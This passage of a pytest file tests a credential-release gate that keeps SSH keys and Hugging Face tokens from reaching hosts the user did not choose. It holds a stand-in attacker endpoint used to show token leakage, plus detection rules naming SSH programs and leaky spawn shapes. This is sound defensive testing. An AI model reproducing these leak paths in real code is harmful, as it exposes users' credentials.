        CredentialTarget.for_config(untrusted), config=untrusted
    )

    assert allowed.local_identities is True
    assert refused.local_identities is False
    assert (
        CredentialRelease(target=_a_target(), refusal="none").local_identities is False
    )


# ---------------------------------------------------------------------------
# Route 13b: $HF_ENDPOINT chose where the released token was sent.
# ---------------------------------------------------------------------------


def test_the_huggingface_client_is_pinned_to_the_host_the_gate_decided_about():
    """``fixed_service`` names a recipient; the client has to go there.

    ``HfApi(token=...)`` with no ``endpoint=`` takes ``$HF_ENDPOINT``, so
    the gate released the token for ``huggingface.co`` while the object
    carrying it pointed wherever an inherited environment variable said. On
    the wire, with a loopback listener standing in for the attacker's Hub,
    that listener received the token in an ``Authorization`` header.

    In a **subprocess**, because ``huggingface_hub`` reads ``$HF_ENDPOINT``
    once at import: the same reason the defect is invisible to in-process
    reasoning is the reason this test has to cross a process boundary. The
    unpinned half is asserted too -- a pinning test that would pass without
    the pinning is not a test.
    """
    import json
    import subprocess
    import sys

    from clustrix.credential_release import (
        FIXED_SERVICE_HOSTS,
        HUGGINGFACE_ENDPOINT,
    )

    program = (
        "import json;"
        "from huggingface_hub import HfApi;"
        "from clustrix.credential_release import huggingface_client_kwargs as k;"
        "print(json.dumps(["
        "HfApi().endpoint, HfApi(**k()).endpoint]))"
    )
    environment = dict(os.environ, HF_ENDPOINT="https://attacker.invalid")
    completed = subprocess.run(
        [sys.executable, "-c", program],
        capture_output=True,
        text=True,
        cwd=str(pathlib.Path(__file__).resolve().parents[2]),
        env=environment,
        timeout=120,
    )
    assert completed.returncode == 0, completed.stderr
    unpinned, pinned = json.loads(completed.stdout.strip().splitlines()[-1])

    assert HUGGINGFACE_ENDPOINT == f"https://{FIXED_SERVICE_HOSTS[0]}"
    assert unpinned == "https://attacker.invalid"
    assert pinned == HUGGINGFACE_ENDPOINT


# ---------------------------------------------------------------------------
# derived_provenance answers about the host it was asked about.
# ---------------------------------------------------------------------------


def test_a_trusted_config_does_not_vouch_for_some_other_host():
    """The fall-through was ``get_config_source(config)``, which is a fact
    about ``config.cluster_host`` and about nothing else.

    So a config the user really did choose vouched for every host in the
    world that no file had happened to name, and the hostless
    ``SSH_PASSWORD`` went to it.
    """
    trusted = ClusterConfig(cluster_host="myhpc.example.edu", username="victim")

    assert get_config_source(trusted) in TRUSTED_CONFIG_SOURCES
    assert derived_provenance(trusted, "myhpc.example.edu") in TRUSTED_CONFIG_SOURCES
    assert derived_provenance(trusted, "totally-unrelated.attacker.example") is None
    assert derived_provenance(trusted, "127.0.0.1") is None


def test_a_hostless_credential_is_not_released_to_an_unrelated_host():
    """The consequence of the above, at the gate rather than below it."""
    trusted = ClusterConfig(cluster_host="myhpc.example.edu", username="victim")
    target = CredentialTarget(
        hostname="totally-unrelated.attacker.example",
        username="victim",
        described_as="a host nobody named",
    )

    refusal = stored_credential_is_for_config(
        trusted, {"password": "x"}, hostname=target.hostname
    )

    assert refusal is not None
    assert "totally-unrelated.attacker.example" in refusal


@pytest.mark.parametrize("hostname", [0, None, False, [], "", "   ", 123], ids=repr)
def test_a_hostname_that_cannot_be_normalised_has_no_provenance(hostname):
    """``if hostname and not normalize_hostname(hostname)`` skipped the falsy
    half, so ``0``, ``None``, ``False``, ``[]`` and ``""`` inherited the
    config's trust while ``"   "`` and ``123`` were correctly refused.

    Falsy or truthy is not a distinction anything downstream can act on:
    neither can be keyed in the taint map and neither can be compared by
    ``hostname_matches``.
    """
    trusted = ClusterConfig(cluster_host="myhpc.example.edu", username="victim")

    assert derived_provenance(trusted, hostname) is None


# ---------------------------------------------------------------------------
# Mutants that survived the full suite. A surviving mutant means untested.
# ---------------------------------------------------------------------------


def _calling_from(module_name, function_name):
    """Run ``_stored_credential`` from a frame with a chosen module and name.

    ``exec`` into a namespace whose ``__name__`` is the one being tested is
    the only way to produce a caller with a *chosen* module -- and it is the
    documented limit of the guard when the module chosen is the gate's own.
    What it lets this test do is separate the guard's two halves, which is
    what the mutants below turn out to hinge on.
    """
    namespace = {
        "__name__": module_name,
        "_stored_credential": credential_release_module._stored_credential,
    }
    exec(
        f"def {function_name}():\n" f"    return _stored_credential('ssh')\n",
        namespace,
    )
    return namespace[function_name]()


def test_the_gates_module_alone_does_not_make_you_one_of_its_obtainers():
    """M6: the per-function half of the caller check.

    ``assert_called_from`` takes *function* names, and the reason is that a
    module check alone passes **by construction** for anything reached from
    inside the file. Every existing test satisfied the module half by
    failing it -- they call from a test module -- so a mutant that dropped
    the ``allowed`` half survived the whole suite.

    This is a caller that has already satisfied the module half. Only the
    function half can refuse it.
    """
    with pytest.raises(RuntimeError) as raised:
        _calling_from(credential_release_module.__name__, "not_an_obtainer")

    assert "not_an_obtainer" in str(raised.value)


def test_being_called_the_right_thing_from_the_wrong_module_is_not_enough():
    """M8: the two halves are ``or``, not ``and``.

    With ``and``, a caller that fails the module check but happens to be
    *named* ``describe_credential`` -- which anybody can name a function --
    passes. Both halves must hold, so failing either is a refusal.
    """
    with pytest.raises(RuntimeError) as raised:
        _calling_from("attacker.module", "describe_credential")

    assert "attacker.module" in str(raised.value)


def test_the_default_release_sources_do_not_include_the_config_fields():
    """M10: adding ``"config-field"`` to the default.

    The two connection paths opt into it by naming it first. The auth
    chain's credential-store method must not start answering with
    ``config.password``: the branch exists so those two paths stop reading
    the fields *before* the gate, not so every caller gets them.
    """
    from clustrix.credential_release import DEFAULT_RELEASE_SOURCES

    trusted = ClusterConfig(
        cluster_host="chosen.example.edu",
        username="victim",
        password=SENTINEL_PASSWORD,
        key_file="/does/not/matter",
    )

    released = release_credential(CredentialTarget.for_config(trusted), config=trusted)

    assert "config-field" not in DEFAULT_RELEASE_SOURCES
    assert released.password != SENTINEL_PASSWORD
    assert released.key_path is None
    assert released.refusal is not None


def test_a_rebuild_keeps_the_taint_that_was_recorded_and_drops_the_guess():
    """The two kinds of untrust are not the same claim, and must not be.

    A config a loader *read* has its hostname written into the process-wide
    record, so no rebuild can launder it -- that is the route the widget's
    Apply button and ``dataclasses.replace`` both took, and it is closed.

    A config merely *guessed* untrusted -- built somewhere else in the
    process while an unrelated untrusted read happened to be open -- is
    marked per object and nothing is written about the hostname, so a
    rebuild re-runs the guess and comes back ``runtime``. Making that mark
    survive would mean recording a hostname permanently on a guess, which is
    the thing measured over-tainting 96,739 of 96,740 constructions with no
    API able to clear it. The attacker's own config is never in this case:
    every loader records the hostname itself.
    """
    import dataclasses

    read_by_a_loader = ClusterConfig(cluster_host="named-by-a-file.example")
    config_module.set_config_source(read_by_a_loader, CONFIG_SOURCE_WORKING_DIRECTORY)

    with config_module.config_built_from_file(CONFIG_SOURCE_WORKING_DIRECTORY):
        guessed = ClusterConfig(cluster_host="built-elsewhere.example")

    assert get_config_source(read_by_a_loader) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert (
        get_config_source(dataclasses.replace(read_by_a_loader))
        == CONFIG_SOURCE_WORKING_DIRECTORY
    )
    assert get_config_source(guessed) == CONFIG_SOURCE_WORKING_DIRECTORY
    assert config_module.source_that_named_hostname("built-elsewhere.example") is None
    assert get_config_source(dataclasses.replace(guessed)) == CONFIG_SOURCE_RUNTIME


def test_ssh_key_setup_does_not_offer_your_key_collection_to_a_repo_host(
    key_only_server, env_file, tmp_path, monkeypatch
):
    """A fourth route-13 site, found while fixing the first three.

    ``setup_ssh_keys`` begins by *trying every key in ``~/.ssh``* against
    ``config.cluster_host`` (``detect_existing_ssh_key``), one
    ``key_filename=`` at a time -- so turning paramiko's own search off says
    nothing about it. It is public API, ``clustrix ssh-setup`` calls it,
    both widgets have a button for it, and ``setup_auth_with_fallback``
    reaches it too. A ``./clustrix.yml`` naming ``cluster_host`` was enough
    to have the victim's whole key collection presented to the host that
    file named, and the attacker learns which of them the victim holds even
    when none is authorised.

    Deploying a key to a host is the same decision as letting paramiko find
    one, so it is the same rule, asked in the same words.
    """
    from clustrix.ssh_utils import setup_ssh_keys

    env_file()
    _repository_naming_only_the_host(key_only_server, tmp_path, monkeypatch)
    config = get_config()

    result = setup_ssh_keys(config, password="")

    assert result["success"] is False
    assert "not offering your SSH keys" in result["error"]
    assert key_only_server.authentications == [], (
        "the key setup path offered the victim's keys to a host named by a "
        "working-directory file: " + repr(key_only_server.authentications)
    )


def test_ssh_key_setup_still_runs_for_a_host_the_user_chose(key_only_server, env_file):
    """The refusal above must not be "key setup no longer works"."""
    from clustrix.ssh_utils import setup_ssh_keys

    env_file()
    (get_config_dir() / "config.yml").write_text(
        _config_text(key_only_server), encoding="utf-8"
    )
    config_module._load_default_config()

    result = setup_ssh_keys(get_config(), password="")

    assert result["error"] is None or "not offering your SSH keys" not in (
        result["error"] or ""
    )
    assert key_only_server.authentications, (
        "key setup did not even try the existing keys for a host the user "
        "chose, so the gate has become an outage"
    )


# ---------------------------------------------------------------------------
# Route 13, seventh site: the ``ssh-copy-id`` subprocess.
#
# ``deploy_public_key`` shells out before it reaches paramiko, so the AST
# rule above -- which reads ``x.connect(...)`` calls -- could not see it, and
# the gate's decision stopped at the Python boundary. OpenSSH offers the
# default identity files *and* every key in the running agent unless told
# otherwise, and ``ssh-copy-id`` pins identities only while it is testing
# which keys are already installed: the invocation that actually logs in and
# appends to ``authorized_keys`` runs plain ``ssh``.
# ---------------------------------------------------------------------------

#: The OpenSSH programs that open a connection on clustrix's behalf. Each
#: one performs its own credential discovery and its own host key check, so
#: each one has to be told the two decisions the paramiko sites are told.
#:
#: ``rsync`` is here because it is not a transport of its own: given a
#: ``host:path`` argument it execs ``ssh``, inheriting every default this
#: rule exists to override. It was proven exploitable rather than argued
#: about -- a shipped-looking ``subprocess.run(["rsync", "-a", src,
#: f"{user}@{host}:{dst}"])`` authenticated ``('victim', 'publickey')``
#: while this rule stayed green.
OPENSSH_CONNECTING_PROGRAMS = ("ssh", "ssh-copy-id", "scp", "sftp", "rsync")

#: What such an invocation must name, somewhere the command was built.
#: ``IdentitiesOnly`` (with ``IdentityFile``) is the local-identity
#: decision; ``StrictHostKeyChecking`` is the host key policy.
OPENSSH_REQUIRED_OPTIONS = ("IdentitiesOnly", "StrictHostKeyChecking")

#: The marker :func:`_unpinned_openssh_subprocesses` reports when it cannot
#: tell what a ``subprocess`` call is about to exec. "I could not see it" is
#: a finding here rather than a silence, which is the whole difference
#: between this rule and the one it replaced.
UNRESOLVED_PROGRAM = "<program-not-a-literal>"

#: The ``subprocess`` calls in ``clustrix/`` whose program genuinely is not a
#: literal, as ``(module, enclosing definitions)``. Each entry is a claim
#: that the name comes from somewhere that cannot be an OpenSSH client;
#: adding one is where somebody has to look.
RUNTIME_CHOSEN_PROGRAM_ALLOWLIST = {
    # ``sys.executable`` -- this interpreter, running pip.
    ("utils.py", "get_environment_info"),
    # ``$EDITOR``, opening the credential file for the user to edit. It is
    # spawned with a filename and no host, and it is the user's own
    # variable rather than anything a clustrix configuration sets.
    ("cli_credentials.py", "edit_credentials_command"),
}


def _program_name(text):
    """The program a command string names: first word, basename.

    ``"ssh -o X h"``, ``"/usr/bin/ssh"`` and ``"ssh"`` are the same
    invocation, and ``shell=True`` is how P7 wrote it.
    """
    words = str(text).split()
    if not words:
        return None
    return pathlib.PurePosixPath(words[0]).name


def _leftmost_string(node):
    """The leftmost string literal of a string being assembled, or ``None``.

    ``None`` means "this is not a string expression" -- a list
    concatenation, or something whose left end is a name -- which the
    caller handles differently from "a string whose start I cannot see".
    """
    import ast

    while True:
        if isinstance(node, ast.Constant):
            return node.value if isinstance(node.value, str) else None
        if isinstance(node, ast.JoinedStr):
            if not node.values:
                return None
            node = node.values[0]
            continue
        if isinstance(node, ast.BinOp):
            node = node.left
            continue
        return None


def _assignments_to(name, scope):
    """Every value ``name`` is assigned or appended in ``scope``."""
    import ast

    values = []
    for node in ast.walk(scope):
        if isinstance(node, ast.Assign) and any(
            isinstance(t, ast.Name) and t.id == name for t in node.targets
        ):
            values.append(node.value)
        elif (
            isinstance(node, (ast.AugAssign, ast.AnnAssign))
            and isinstance(node.target, ast.Name)
            and node.target.id == name
            and node.value is not None
        ):
            values.append(node.value)
        elif isinstance(node, ast.For) and (
            isinstance(node.target, ast.Name) and node.target.id == name
        ):
            values.append(node.iter)
    return values


def _function_defs(tree):
    """Every ``def`` in ``tree``, by name. Enough to follow P8's helper."""
    import ast

    found = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            found.setdefault(node.name, node)
    return found


def _program_candidates(node, scope, tree, scopes, seen=None):
    """``(names, resolved)`` for the command argument ``node``.

    ``names`` is what this call could exec; ``resolved`` says whether the
    walk ever reached a string literal. Every scope it passes through is
    added to ``scopes``, because for a command assembled in a helper the
    place that has to name the options is the helper.

    The four shapes this exists for, each of which survived the previous
    version of the rule *and wire-authenticated* ``('victim', 'publickey')``:

    * P6, a program held in a variable -- ``prog = "ssh"`` then
      ``subprocess.run([prog, host])``;
    * P7, ``shell=True`` with the command as a single string;
    * P8, a command list built by a different function and returned;
    * and ``rsync``, which is P5 and is a list entry in its own right.
    """
    import ast

    seen = set() if seen is None else seen
    if id(node) in seen or len(seen) > 200:
        return set(), False
    seen.add(id(node))
    scopes.add(scope)

    if isinstance(node, ast.Constant):
        name = _program_name(node.value) if isinstance(node.value, str) else None
        return ({name} if name else set()), name is not None
    if isinstance(node, ast.Starred):
        return _program_candidates(node.value, scope, tree, scopes, seen)
    if isinstance(node, (ast.List, ast.Tuple)):
        # An empty literal names no program and says nothing about the
        # others, which is why it is "resolved to nothing" rather than
        # unresolved: ``cmd = []`` followed by ``cmd = ['ssh']`` is one of
        # the ordinary ways to build a command.
        if not node.elts:
            return set(), True
        return _program_candidates(node.elts[0], scope, tree, scopes, seen)
    if isinstance(node, (ast.BinOp, ast.JoinedStr)):
        text = _leftmost_string(node)
        if text is None:
            # Not a string being assembled -- ``cmd + [src, dst]`` and
            # ``['ssh'] + args`` are list concatenation, so the program is
            # still whatever the left side starts with.
            if isinstance(node, ast.BinOp):
                return _program_candidates(node.left, scope, tree, scopes, seen)
            return set(), False
        # The leftmost literal only *ends* the program name if something in
        # it separates the name from the next word. ``"ssh " + host`` names
        # ssh; ``"ss" + "h"`` and ``f"ss{h}"`` are the program name itself
        # being assembled, and this rule cannot follow that -- so it says so
        # rather than reporting the prefix as the program.
        if not any(character.isspace() for character in text):
            return set(), False
        name = _program_name(text)
        return ({name} if name else set()), name is not None
    if isinstance(node, ast.Name):
        values = _assignments_to(node.id, scope)
        if not values:
            return set(), False
        names, resolved = set(), True
        for value in values:
            found, ok = _program_candidates(value, scope, tree, scopes, seen)
            names |= found
            # ``all``, not ``any``: one branch of an assignment resolving is
            # not evidence about the others, and a name that is sometimes a
            # literal and sometimes ``os.getenv(...)`` is exactly the shape
            # this must not wave through.
            resolved = resolved and ok
        return names, resolved
    if isinstance(node, ast.Call):
        func = node.func
        if isinstance(func, ast.Attribute) and func.attr in ("split", "format"):
            return _program_candidates(func.value, scope, tree, scopes, seen)
        if isinstance(func, ast.Name):
            definition = _function_defs(tree).get(func.id)
            if definition is not None:
                names, resolved, returns = set(), True, 0
                for returned in ast.walk(definition):
                    if isinstance(returned, ast.Return) and returned.value is not None:
                        returns += 1
                        found, ok = _program_candidates(
                            returned.value, definition, tree, scopes, seen
                        )
                        names |= found
                        resolved = resolved and ok
                return names, resolved and returns > 0
    return set(), False


def _spawns_a_process(call):
    """A call that hands a command to the operating system.

    ``subprocess.anything`` and the ``os`` spawners, because ``os.system``
    takes the P7 shape by construction and nothing in this package should
    grow one unnoticed.
    """
    import ast

    func = call.func
    if not isinstance(func, ast.Attribute) or not isinstance(func.value, ast.Name):
        return False
    if func.value.id == "subprocess":
        return True
    return func.value.id == "os" and func.attr in (
        "system",
        "popen",
        "execl",
        "execle",
        "execlp",
        "execv",
        "execve",
        "execvp",
        "execvpe",
        "posix_spawn",
        "posix_spawnp",
        "spawnl",
        "spawnv",
        "spawnvp",
    )


def _unpinned_openssh_subprocesses(text):
    """``subprocess``/``os`` spawns in ``text`` that exec an OpenSSH client unpinned.

    The command argument is *resolved* rather than pattern-matched -- see
    :func:`_program_candidates` -- so the four shapes an earlier version of
    this rule listed as admitted limitations are covered: a program held in
    a variable, a ``shell=True`` command string, a list assembled by another
    function, and ``rsync`` (which execs ``ssh``). Each of those was written
    as a shipped-looking call site and each one authenticated against a real
    server while the rule reported nothing, so they are defects rather than
    caveats.

    When the program name is genuinely not a literal the call is reported
    with :data:`UNRESOLVED_PROGRAM` instead of being passed over in silence.
    ``clustrix/`` has four such calls and they are written down in
    :data:`RUNTIME_CHOSEN_PROGRAM_ALLOWLIST`.

    **What is still open, stated because a rule that cannot fire reads as
    coverage.** A program name assembled at run time (``"ss" + "h"``), one
    read out of a configuration field or the environment, a wrapper earlier
    on ``$PATH`` that happens to be named something else, and anything
    outside ``clustrix/``. Those are the same computed-name limits every
    other static rule in this suite has; what answers them is the runtime
    gate, not this file. The residual is executable rather than prose:
    :func:`test_the_openssh_subprocess_rule_states_its_own_blind_spots`
    fails if one of them silently starts working, so the list cannot drift
    out of date in the flattering direction.
    """
    import ast

    tree = ast.parse(text)
    offenders = []

    def options_named_in(scopes):
        found = set()
        for scope in scopes:
            for node in ast.walk(scope):
                if isinstance(node, ast.Constant) and isinstance(node.value, str):
                    for option in OPENSSH_REQUIRED_OPTIONS:
                        if option in node.value:
                            found.add(option)
        return found

    def visit(node, scope):
        for child in ast.iter_child_nodes(node):
            if isinstance(child, ast.Call) and _spawns_a_process(child) and child.args:
                scopes = {scope}
                programs, resolved = _program_candidates(
                    child.args[0], scope, tree, scopes
                )
                if not resolved:
                    offenders.append((child.lineno, (UNRESOLVED_PROGRAM,)))
                elif programs & set(OPENSSH_CONNECTING_PROGRAMS):
                    named = options_named_in(scopes)
                    missing = tuple(
                        o for o in OPENSSH_REQUIRED_OPTIONS if o not in named
                    )
                    if missing:
                        offenders.append((child.lineno, missing))
            inner = (
                child
                if isinstance(child, (ast.FunctionDef, ast.AsyncFunctionDef))
                else scope
            )
            visit(child, inner)

    visit(tree, tree)
    return sorted(set(offenders))


def _scope_of_line(text):
    """``lineno -> dotted enclosing definitions``, for reporting offenders."""
    import ast

    scopes = {}

    class Walker(ast.NodeVisitor):
        def __init__(self):
            self.stack = []

        def _scoped(self, node):
            self.stack.append(node.name)
            self.generic_visit(node)
            self.stack.pop()

        visit_FunctionDef = _scoped
        visit_AsyncFunctionDef = _scoped
        visit_ClassDef = _scoped

        def generic_visit(self, node):
            if hasattr(node, "lineno"):
                scopes.setdefault(node.lineno, ".".join(self.stack))
            super().generic_visit(node)

    Walker().visit(ast.parse(text))
    return scopes


def test_no_openssh_subprocess_leaves_the_identity_search_or_host_policy_open():
    """The rule that stops an eighth route-13 site appearing as a subprocess.

    ``deploy_public_key`` was the seventh, and the sixth site's rule could
    not see it: it reads ``connect()`` calls, and this one is an ``execve``.

    A call whose program is not a literal is reported too, and has to be
    written into :data:`RUNTIME_CHOSEN_PROGRAM_ALLOWLIST`. The previous
    version of this rule said nothing about those, which is how a command
    assembled in a variable, a ``shell=True`` string and a list built in a
    helper each walked past it while authenticating for real.
    """
    package = pathlib.Path(config_module.__file__).parent

    unpinned = {}
    unresolved = set()
    for path in sorted(package.glob("*.py")):
        text = path.read_text(encoding="utf-8")
        found = _unpinned_openssh_subprocesses(text)
        if not found:
            continue
        scopes = _scope_of_line(text)
        for lineno, missing in found:
            if missing == (UNRESOLVED_PROGRAM,):
                unresolved.add((path.name, scopes.get(lineno, "")))
            else:
                unpinned.setdefault(path.name, []).append((lineno, missing))

    assert not unpinned, (
        "an OpenSSH client was exec'd without naming IdentitiesOnly and "
        "StrictHostKeyChecking, so it performs its own credential discovery "
        "and its own host key check outside the gate and outside "
        "ssh_security (route 13, via subprocess): " + repr(unpinned)
    )
    assert unresolved == RUNTIME_CHOSEN_PROGRAM_ALLOWLIST, (
        "a subprocess call runs a program this rule cannot identify. If it "
        "can never be an OpenSSH client, add it to "
        "RUNTIME_CHOSEN_PROGRAM_ALLOWLIST and say why; if it can, name the "
        "program as a literal so the rule can see it.\n"
        f"  unexpected: {sorted(unresolved - RUNTIME_CHOSEN_PROGRAM_ALLOWLIST)}\n"
        f"  gone:       {sorted(RUNTIME_CHOSEN_PROGRAM_ALLOWLIST - unresolved)}"
    )


def test_the_openssh_subprocess_rule_fires_on_what_it_is_for_and_nothing_else():
    """Kills: matching any list, and matching only an inline command."""
    assert _unpinned_openssh_subprocesses(
        "def f(h):\n"
        "    cmd = ['ssh-copy-id', '-i', 'k.pub']\n"
        "    subprocess.run(cmd)\n"
    ) == [(3, ("IdentitiesOnly", "StrictHostKeyChecking"))]
    assert _unpinned_openssh_subprocesses(
        "def f(h):\n    subprocess.run(['ssh', h])\n"
    ) == [(2, ("IdentitiesOnly", "StrictHostKeyChecking"))]
    assert _unpinned_openssh_subprocesses(
        "def f(h):\n"
        "    cmd = ['ssh', h]\n"
        "    cmd += ['-o', 'StrictHostKeyChecking=yes']\n"
        "    subprocess.run(cmd)\n"
    ) == [(4, ("IdentitiesOnly",))]
    assert (
        _unpinned_openssh_subprocesses(
            "def f(h):\n"
            "    cmd = ['ssh', h]\n"
            "    cmd += ['-o', 'StrictHostKeyChecking=yes']\n"
            "    cmd += ['-o', 'IdentitiesOnly=yes']\n"
            "    subprocess.run(cmd)\n"
        )
        == []
    )
    # A list of credential providers is not an invocation, and a program
    # that authenticates nothing is not one either.
    assert _unpinned_openssh_subprocesses("def f():\n    x = ['ssh', 'hf']\n") == []
    assert (
        _unpinned_openssh_subprocesses(
            "def f(h):\n    subprocess.run(['ssh-keyscan', h])\n"
        )
        == []
    )
    # A sibling function's pinning does not vouch for this one.
    assert _unpinned_openssh_subprocesses(
        "def pinned(h):\n"
        "    subprocess.run(['ssh', '-o', 'IdentitiesOnly=yes',\n"
        "                    '-o', 'StrictHostKeyChecking=yes', h])\n"
        "\n"
        "def unpinned(h):\n"
        "    subprocess.run(['ssh', h])\n"
    ) == [(6, ("IdentitiesOnly", "StrictHostKeyChecking"))]


BOTH_OPTIONS = ("IdentitiesOnly", "StrictHostKeyChecking")


@pytest.mark.parametrize(
    "label, source, expected",
    [
        (
            "P5: rsync execs ssh",
            "def f(src, user, host, dst):\n"
            "    subprocess.run(['rsync', '-a', src, f'{user}@{host}:{dst}'])\n",
            [(2, BOTH_OPTIONS)],
        ),
        (
            "P6: the program is held in a variable",
            "def f(h):\n" "    prog = 'ssh'\n" "    subprocess.run([prog, h])\n",
            [(3, BOTH_OPTIONS)],
        ),
        (
            "P6b: the whole command is built by appending",
            "def f(h):\n"
            "    cmd = []\n"
            "    cmd = ['ssh']\n"
            "    cmd.append(h)\n"
            "    subprocess.run(cmd)\n",
            [(5, BOTH_OPTIONS)],
        ),
        (
            "P7: shell=True with the command as one string",
            "def f(h):\n" "    subprocess.run(f'ssh {h} true', shell=True)\n",
            [(2, BOTH_OPTIONS)],
        ),
        (
            "P7b: shell=True with an absolute path",
            "def f(h):\n" "    subprocess.run('/usr/bin/ssh ' + h, shell=True)\n",
            [(2, BOTH_OPTIONS)],
        ),
        (
            "P7c: os.system, which is shell=True by construction",
            "def f(h):\n    os.system('ssh ' + h)\n",
            [(2, BOTH_OPTIONS)],
        ),
        (
            "P8: the command list is built by another function",
            "def build(h):\n"
            "    return ['ssh', h]\n"
            "\n"
            "def f(h):\n"
            "    subprocess.run(build(h))\n",
            [(5, BOTH_OPTIONS)],
        ),
        (
            "the program cannot be identified at all",
            "def f(prog, h):\n    subprocess.run([prog, h])\n",
            [(2, (UNRESOLVED_PROGRAM,))],
        ),
    ],
    ids=[
        "rsync",
        "variable-program",
        "appended-command",
        "shell-true-fstring",
        "shell-true-concat",
        "os-system",
        "helper-built-list",
        "unidentifiable",
    ],
)
def test_the_openssh_subprocess_rule_sees_the_shapes_that_used_to_survive_it(
    label, source, expected
):
    """P5-P8: four admitted limitations, each proven exploitable.

    Every one of these was written as a shipped-looking call site and
    **wire-authenticated** ``('victim', 'publickey')`` against a real
    server while the previous version of this rule reported nothing. An
    admitted limitation that is demonstrably exploitable is a defect, so
    each shape is now resolved rather than listed.
    """
    assert _unpinned_openssh_subprocesses(source) == expected, label


@pytest.mark.parametrize(
    "label, source",
    [
        (
            "P5 pinned",
            "def f(src, host, dst):\n"
            "    cmd = ['rsync', '-e',\n"
            "           'ssh -o IdentitiesOnly=yes -o StrictHostKeyChecking=yes']\n"
            "    subprocess.run(cmd + [src, f'{host}:{dst}'])\n",
        ),
        (
            "P6 pinned",
            "def f(h):\n"
            "    prog = 'ssh'\n"
            "    subprocess.run([prog, '-o', 'IdentitiesOnly=yes',\n"
            "                    '-o', 'StrictHostKeyChecking=yes', h])\n",
        ),
        (
            "P7 pinned",
            "def f(h):\n"
            "    subprocess.run(\n"
            "        f'ssh -o IdentitiesOnly=yes -o StrictHostKeyChecking=yes {h}',\n"
            "        shell=True)\n",
        ),
        (
            "P8 pinned in the helper that builds it",
            "def build(h):\n"
            "    return ['ssh', '-o', 'IdentitiesOnly=yes',\n"
            "            '-o', 'StrictHostKeyChecking=yes', h]\n"
            "\n"
            "def f(h):\n"
            "    subprocess.run(build(h))\n",
        ),
        (
            "a program that is not an OpenSSH client",
            "def f():\n    subprocess.run(['pip', 'list'])\n",
        ),
        ("a shell command that is not one either", "def f():\n    os.system('true')\n"),
    ],
    ids=["rsync", "variable", "shell-true", "helper", "pip", "shell-other"],
)
def test_the_broadened_rule_still_accepts_a_pinned_invocation(label, source):
    """The control arm: broadening must not make every spawn an offender.

    In particular the P8 shape has to be satisfiable *where the command is
    built*, or the only way to pass would be to stop using helpers.
    """
    assert _unpinned_openssh_subprocesses(source) == [], label


def test_the_openssh_subprocess_rule_states_its_own_blind_spots():
    """The residual, executable rather than prose.

    A static rule cannot follow a program name that does not exist until
    run time, and saying so in a docstring lets the claim rot. These are
    the shapes that still walk past, asserted so that the list is a
    measurement: if one of them silently starts being caught, this fails
    and the docstring above gets shorter. Each is reported as
    :data:`UNRESOLVED_PROGRAM` rather than passed over in silence, which is
    the difference between a blind spot and a hole -- the same treatment
    ``tests/unit/test_credential_file_permissions.py`` gives its own.
    """
    assembled = "def f(h):\n    subprocess.run(['ss' + 'h', h])\n"
    from_config = "def f(cfg, h):\n    subprocess.run([cfg.ssh_program, h])\n"
    from_environment = "def f(h):\n    subprocess.run([os.environ['SSH'], h])\n"

    for source in (assembled, from_config, from_environment):
        assert _unpinned_openssh_subprocesses(source) == [
            (2, (UNRESOLVED_PROGRAM,))
        ], source

    # And what no static rule in this file can reach at all: a wrapper
    # earlier on $PATH, and anything outside ``clustrix/``. Those are
    # answered by the runtime gate, not here.
    assert (
        _unpinned_openssh_subprocesses(
            "def f(h):\n    subprocess.run(['my-deploy-helper', h])\n"
        )
        == []
    )


@pytest.fixture
def agent_identity(tmp_path, monkeypatch):
    """A real ``ssh-agent`` holding one synthetic identity.

    The agent is the half of route 13 a redirected ``$HOME`` can actually
    reach: OpenSSH resolves ``~/.ssh/id_rsa`` from the passwd database, so a
    test cannot put a synthetic key where ``ssh`` looks for its defaults --
    but ``SSH_AUTH_SOCK`` *is* read from the environment. An agent identity
    and a default identity file are the same kind of secret (one that names
    no host), and OpenSSH offers both from the same invocation, so pinning
    measured on the agent is pinning.
    """
    if shutil.which("ssh-agent") is None or shutil.which("ssh-add") is None:
        pytest.skip("ssh-agent/ssh-add are not installed")

    key = paramiko.RSAKey.generate(2048)
    private = tmp_path / "victim_agent_id"
    key.write_private_key_file(str(private))
    private.chmod(0o600)
    public = tmp_path / "victim_agent_id.pub"
    public.write_text(f"ssh-rsa {key.get_base64()} victim-agent\n", encoding="utf-8")

    # A unix socket path is capped near 104 bytes and pytest's tmp_path is
    # already longer than that, so the agent gets its own short directory.
    agent_dir = pathlib.Path(
        tempfile.mkdtemp(
            prefix="cx-agent-", dir="/tmp" if os.path.isdir("/tmp") else None
        )
    )
    sock = str(agent_dir / "s")
    started = subprocess.run(
        ["ssh-agent", "-a", sock], capture_output=True, text=True, check=True
    )
    pid = re.search(r"SSH_AGENT_PID=(\d+)", started.stdout)
    monkeypatch.setenv("SSH_AUTH_SOCK", sock)
    subprocess.run(
        ["ssh-add", str(private)], capture_output=True, text=True, check=True
    )
    # ssh-copy-id makes its scratch directory with `mktemp -d ~/.ssh/...`,
    # which the shell expands from $HOME -- the isolated one.
    (pathlib.Path.home() / ".ssh").mkdir(mode=0o700, parents=True, exist_ok=True)

    yield public

    if pid:
        with contextlib.suppress(ProcessLookupError):
            os.kill(int(pid.group(1)), signal.SIGTERM)
    shutil.rmtree(agent_dir, ignore_errors=True)


@pytest.fixture
def agent_only_server(tmp_path, agent_identity):
    """A server that accepts the agent's identity and nothing else."""
    root = tmp_path / "attacker-root"
    root.mkdir()
    with LocalSSHServer(
        root=str(root), password=None, authorized_keys=[str(agent_identity)]
    ) as server:
        yield server


def _a_key_pair_to_deploy(tmp_path):
    """A real pair, because ``ssh-copy-id -i x.pub`` demands the private half.

    ``use_id_file`` in ``/usr/bin/ssh-copy-id`` derives ``PRIV_ID_FILE`` by
    stripping ``.pub`` and exits before connecting if it cannot read it, so
    a lone ``.pub`` would have exercised nothing at all.
    """
    key = paramiko.RSAKey.generate(2048)
    private = tmp_path / "id_rsa_clustrix_victim"
    key.write_private_key_file(str(private))
    private.chmod(0o600)
    public = tmp_path / "id_rsa_clustrix_victim.pub"
    public.write_text(f"ssh-rsa {key.get_base64()} clustrix\n", encoding="utf-8")
    return key, public


def _trust_this_host_deliberately(server):
    """What the reject-policy error message tells the user to run, run by hand.

    Keeping the host key question answered separates it from the identity
    question: with the key already in ``known_hosts`` a refused deployment
    was refused over identities, not over host verification.
    """
    scan = subprocess.run(
        ["ssh-keyscan", "-p", str(server.port), server.host],
        capture_output=True,
